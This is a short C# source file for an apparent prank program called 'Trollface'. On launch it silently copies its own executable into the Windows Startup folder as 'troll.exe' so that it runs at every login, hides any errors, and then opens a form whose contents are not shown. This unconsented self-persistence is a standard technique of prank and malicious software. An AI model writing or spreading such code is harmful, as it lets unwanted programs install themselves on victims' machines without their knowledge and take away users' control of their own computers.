using System;
using System.IO;
using System.Windows.Forms;
using System.Media;

namespace Trollface
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            try
			{
                string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                string executableName = AppDomain.CurrentDomain.FriendlyName;
                
                string myPath = AppDomain.CurrentDomain.BaseDirectory;

                string myFullPath = myPath + "\\" + executableName;
                string autostartPath = startupFolder + "\\" + "troll.exe";

                if(!File.Exists(autostartPath))
				{
                    File.Copy(myFullPath, autostartPath);
				}
            }
            catch(Exception e)
			{
			}
            try
            {
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);
                Application.Run(new MainForm());
            }
            catch(Exception e)
            {
            }
        }
    }
}